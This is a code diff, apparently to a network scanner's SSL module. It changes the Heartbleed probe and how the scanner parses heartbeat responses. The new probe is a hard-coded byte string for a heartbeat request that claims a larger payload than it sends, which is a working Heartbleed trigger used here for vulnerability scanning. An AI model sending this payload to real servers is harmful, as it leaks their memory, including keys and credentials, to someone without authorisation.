@@ -224,8 +224,10 @@ server_hello(
         remaining--;
         hello->ext_remaining--;
         if (px[i]) {
-            static const char heartbleed_request[] = "\x18\x03\x02\x00\x03\x01\x40\x00";
-
+            static const char heartbleed_request[] = 
+                "\x15\x03\x02\x00\x02\x01\x80"
+                "\x18\x03\x02\x00\x14\x01" "\x0f\xe9" " "
+                "[masscan/1.0]   ";
             banout_append(  banout, PROTO_VULN, "SSL[heartbeat] ", 15);
             more->payload = heartbleed_request;
             more->length = sizeof(heartbleed_request)-1;
@@ -470,7 +472,7 @@ nothandshake_parse(
     unsigned i;
     enum {
         START,
-        LENGTH0, LENGTH1, LENGTH2,
+        LENGTH0, LENGTH1,
         CONTENTS,
         UNKNOWN,
     };
@@ -498,15 +500,9 @@ nothandshake_parse(
         remaining <<= 8;
         remaining |= px[i];
         //printf("." "  SSL else: type=%u length=%u\n", ssl->record.type, remaining);
-        DROPDOWN(i,length,state);
-
-    case LENGTH2:
-        remaining <<= 8;
-        remaining |= px[i];
-
         switch (ssl->record.type) {
-        case 0x02: /* heartbeat */
-            if (remaining > 1) {
+        case 0x02:
+            if (remaining >= 1) {
                 banout_append(  banout, PROTO_VULN, "SSL[HEARTBLEED] ", 16);
             }
 
@@ -514,7 +510,6 @@ nothandshake_parse(
                 banout_init_base64(&pstate->sub.ssl.x.server_cert.sub.base64);
                 banout_append(banout, PROTO_HEARTBLEED, "", 0);
             }
-            break;
         }
         DROPDOWN(i,length,state);
 
